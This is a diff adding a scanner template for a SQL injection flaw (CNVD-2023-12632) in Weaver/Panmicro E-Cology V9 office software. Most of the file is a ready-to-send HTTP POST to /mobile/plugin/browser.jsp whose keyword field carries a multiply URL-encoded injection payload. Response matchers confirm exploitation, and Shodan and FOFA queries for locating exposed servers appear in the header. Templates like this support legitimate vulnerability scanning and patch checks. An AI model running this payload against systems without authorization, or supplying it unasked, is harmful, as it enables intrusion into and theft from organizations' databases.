@@ -1,0 +1,30 @@
+## id: CNVD-2023-12632
+## name: E-Cology V9 - SQL Injection
+## author: hack007x
+## severity: high
+## tags: cnvd,cnvd2023,ecology,sqli,vuln
+## description: Ecology9 is a new and efficient collaborative office system created by Panmicro for medium and large organizations. There is a SQL injection vulnerability in Panmicro ecology9, which can be exploited by attackers to obtain sensitive database information.
+## reference: https://www.zhihu.com/tardis/zm/art/625931869?source_id=1003
+## reference: https://blog.csdn.net/qq_50854662/article/details/129992329
+## shodan-query: ecology_JSessionid
+## fofa-query: app="泛微-协同商务系统"
+## verification: true
+
+POST /mobile/plugin/browser.jsp HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+isDis=1&browserTypeId=269&keyword=%25%32%35%25%33%36%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%38%25%32%35%25%33%35%25%33%33%25%32%35%25%33%34%25%33%35%25%32%35%25%33%34%25%36%33%25%32%35%25%33%34%25%33%35%25%32%35%25%33%34%25%33%33%25%32%35%25%33%35%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%36%25%36%34%25%32%35%25%33%36%25%33%34%25%32%35%25%33%33%25%33%35%25%32%35%25%33%32%25%33%38%25%32%35%25%33%33%25%33%39%25%32%35%25%33%33%25%33%39%25%32%35%25%33%33%25%33%39%25%32%35%25%33%33%25%33%39%25%32%35%25%33%33%25%33%39%25%32%35%25%33%33%25%33%39%25%32%35%25%33%33%25%33%39%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%37
+
+#@ condition: and
+#@ matcher: body contains "283f42764da6dba2522412916b031080"
+#@ matcher: body contains '"autoCount"'
+#@ matcher: body contains '"autoGet"'
+#@ matcher: status_code == 200
+
+
+
+
+
+# @VEIL-STAMP: 387c0d4503c536cb23d65201d43bd7b6b6a430c6096ba5a0e8a586c0221a0550
